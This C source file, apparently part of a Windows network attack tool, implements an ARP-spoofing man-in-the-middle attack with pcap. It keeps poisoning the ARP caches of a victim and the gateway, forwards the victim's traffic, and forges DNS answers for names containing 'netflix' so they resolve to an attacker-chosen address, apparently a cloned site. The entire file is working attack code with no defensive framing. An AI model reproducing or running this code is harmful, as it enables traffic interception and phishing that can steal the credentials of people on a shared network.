#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "infect.h"

#include <malloc.h>

#include "commands.h"
#include "network_headers.h"
#include "utils.h"

static BOOL finished_infecting;
send_params infect_params;
static char* keyword = "netflix";
u_long fake_web = 264000259; // TODO 

/*
* @purpose: keep sending fake arp packets to maintain MITM.
* @params: thread syntax.
* @return 0.
*/
static DWORD WINAPI start_arp_spoofing(
	LPVOID lparam
)
{
	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);

	u_char victim_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
	u_char gateway_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];

	/* build the packets */
	build_packet(
		victim_packet,
		htonl(infect_params.gateway_ip),
		htonl(infect_params.victim_ip),
		infect_params.adapter->Address,
		infect_params.victim_mac,
		2
	);

	build_packet(
		gateway_packet,
		htonl(infect_params.victim_ip),
		htonl(infect_params.gateway_ip),
		infect_params.adapter->Address,
		infect_params.gateway_mac,
		2
	);

	while (!finished_infecting)
	{
		pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
		pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
		Sleep(2000);
	}
	finished_infecting = 0;
	return 0;
}

/*
* @purpose: adding the correct arp entries to the victim and gateway machines.
* @params: None.
* @return: void.
*/
static void stop_arp_spoofing()
{
	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);

	u_char victim_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
	u_char gateway_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];

	/* build the packets */
	build_packet(
		victim_packet,
		htonl(infect_params.gateway_ip),
		htonl(infect_params.victim_ip),
		infect_params.gateway_mac,
		infect_params.victim_mac,
		2
	);

	build_packet(
		gateway_packet,
		htonl(infect_params.victim_ip),
		htonl(infect_params.gateway_ip),
		infect_params.victim_mac,
		infect_params.gateway_mac,
		2
	);

	pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
	pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
}

/*
* @purpose: change the sizes of the network/transport layers in order to match
* the fake DNS respones.
* @params:  packet - the packet to be changed.
*			end_packet - point to the end of the packet
* @return:	void.
* 
*/
static void change_packet_sizes(
	u_char* packet, 
	void* const end_packet
)
{
	/* locals */
	ip_hdr* ip_header;
	udp_hdr* udp_header;

	ip_header = (ip_hdr*)(packet + sizeof(ether_hdr));
	udp_header = (udp_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr));

	ip_header->length = htons((BYTE*)end_packet - (BYTE*)ip_header);
	udp_header->len = htons((BYTE*)end_packet - (BYTE*)udp_header);
}

/*
* @purpose: changes the answer section of the DNS packet.
* @params:	pDnsSection - pointer to the start of the DNS section (base).
*			pAnswerSection - pointer to the answer section.
*			pQuestion - pointer to the question string (response packet).
* @return:	the pointer to the end of the packet.
* 
*/
static void* create_fake_dns_respones(
	void* const pDnsSection, 
	void* const pAnswerSection, 
	void* const pQuestion
)
{
	/* locals */
	dns_hdr* dns_header = (dns_hdr*)pDnsSection;
	dns_answer answer = *(dns_answer*)pAnswerSection;

	/* make dns constant header match the fake packet */
	dns_header->answers = htons(1); // one answer (fake)
	dns_header->authority = 0;
	dns_header->additional = 0;
	
	/* build the fake answer */
	answer.name = htons((BYTE*)pQuestion - (BYTE*)pDnsSection);
	answer.name |= 0xc0; //(b: 1100-0000) 
	answer.type = htons(1); // addr
	answer.len = htons(4); //ipv4 addr in bytes
	answer.addr = htonl(fake_web);

	*((dns_answer*)pAnswerSection) = answer;
	return (BYTE*)pAnswerSection + sizeof(dns_answer);
}

/*
* @purpose: Checks if a DNS packet is intended for the specific cloned website.
* If so changes the packet for DNS hijacking.
* @params: packet - the network packet
* @return: size of new packet (same size if not the DNS)
* 
*/
static size_t dns_spoofing(
	u_char* packet, 
	size_t packet_size
)
{
	/* check if valid DNS packet */
	ether_hdr* eth_header = (ether_hdr*)packet;
	ip_hdr* ip_header = (ip_hdr*)(packet + sizeof(ether_hdr));
	udp_hdr* udp_header = (udp_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr));
	uint16_t questions;

	if (eth_header->frame_type != htons(NETWORK_IPv4) // ipv4
		|| ip_header->protocol != TRANSPORT_UDP // udp protocol
		|| udp_header->src_port != htons(53)) // dns port
		return packet_size;

	/* locals */
	dns_hdr* dns_header = (dns_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr) + sizeof(udp_hdr));
	u_char* dns_data = (u_char*)dns_header + sizeof(dns_hdr);
	void* temp_p = packet + packet_size;
	BOOL matching_found = 0;

	questions = htons(dns_header->questions);
	for (size_t i = 0; i < questions; i++)
	{
		/* checking for match */
		if (!matching_found)
			if (strstr(dns_data, keyword))
			{
				/* keywords match */
				temp_p = (void*)dns_data;
				matching_found = 1;
			}
		dns_data += strlen(dns_data) + 5; // point to the next question
	}

	if (matching_found)
	{
		/* create fake dns packet */
		temp_p = create_fake_dns_respones(dns_header, dns_data, temp_p);
		/* change udp/ip header length fields */
		change_packet_sizes(packet, temp_p);
		finished_infecting = 1;
	}
	
	return (BYTE*)temp_p - packet;
}

void infect()
{
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG outBufLen = 0;
	ULONG netmask, host;

	pcap_t* fp;
	pcap_if_t* alldevs = NULL, * adapter;
	pcap_addr_t* addr;

	char* filter;
	size_t filter_size;
	char temp_filter[] = "ip host";
	struct in_addr n_addr;
	struct bpf_program fcode;

	int res;
	struct pcap_pkthdr* pkt_header;
	const u_char* pkt_data = NULL;
	size_t packet_size;


	/* allocate heap memory */
	n_addr.S_un.S_addr = htonl(infect_params.victim_ip);
	filter_size = strlen(temp_filter) + strlen(inet_ntoa(n_addr)) + 2; // space and null terminator (2).
	filter = (char*)malloc(filter_size);

	GetAdaptersInfo(pAdapterInfo, &outBufLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);

	pcap_findalldevs(&alldevs, NULL);

	/* check if allocation worked successfully */
	if (!pAdapterInfo || !filter || !alldevs)
		return -1;

	GetAdaptersInfo(pAdapterInfo, &outBufLen);

	for (adapter = alldevs; adapter; adapter = adapter->next)
	{
		int found = 0; //false
		for (addr = adapter->addresses; addr; addr = addr->next)
		{
			host = ((struct sockaddr_in*)(addr->addr))->sin_addr.s_addr;
			netmask = ((struct sockaddr_in*)(addr->netmask))->sin_addr.s_addr;

			if ((host & netmask) == (infect_params.victim_ip & netmask))
			{
				found = 1; //true
				break;
			}
		}
		if (found)
			break;
	}

	if (!adapter)
		return -1;

	/*open the adapter*/
	fp = pcap_open(
		adapter->name,
		65536,
		PCAP_OPENFLAG_PROMISCUOUS,
		1000,
		NULL,
		NULL
	);

	/* create filter */
	snprintf(filter, filter_size, "%s %s\n", temp_filter, inet_ntoa(n_addr));
	if (pcap_compile(fp, &fcode, filter, 1, netmask) < 0)
	{
		free(pAdapterInfo);
		pcap_freealldevs(alldevs);
		return -1;
	}

	if (pcap_setfilter(fp, &fcode) < 0)
	{
		free(pAdapterInfo);
		pcap_freealldevs(alldevs);
		return -1;
	}

	infect_params.fp = fp;
	infect_params.adapter = corresponding_adapter(adapter, pAdapterInfo);

	/*start send_packet thread*/
	HANDLE hThread;
	hThread = CreateThread(NULL, 0, start_arp_spoofing, NULL, 0, NULL);
	if (!hThread)
	{
		pcap_close(fp);
		return -1;
	}

	while ((res = pcap_next_ex(fp, &pkt_header, &pkt_data)) >= 0)
	{
		/* Timeout elapsed */
		if (res == 0)
		{
			if (WaitForSingleObject(hThread, 0) == WAIT_OBJECT_0)
			{
				CloseHandle(hThread);
				break;
			}
			continue;
		}

		ether_hdr* eth_header;
		eth_header = (ether_hdr*)pkt_data;

		/* Check for DNS packets */
		packet_size = dns_spoofing(pkt_data, pkt_header->caplen);

		/* change packet src/dst (MITM) */
		memcmp(eth_header->src_addr, infect_params.victim_mac, ETH_ALEN) == 0 // if src = taget
			? memcpy(eth_header->dest_addr, infect_params.gateway_mac, ETH_ALEN) // (dst = gateway)
			: memcpy(eth_header->dest_addr, infect_params.victim_mac, ETH_ALEN); // else (dst = victim) 
		memcpy(eth_header->src_addr, infect_params.adapter->Address, ETH_ALEN); // src = this

		/* foward packet */
		pcap_sendpacket(fp, pkt_data, packet_size);

		/* redirect worked */
		if (finished_infecting)
		{
			stop_arp_spoofing();
			CloseHandle(hThread);
			break;
		}
	}

	return 0;
}
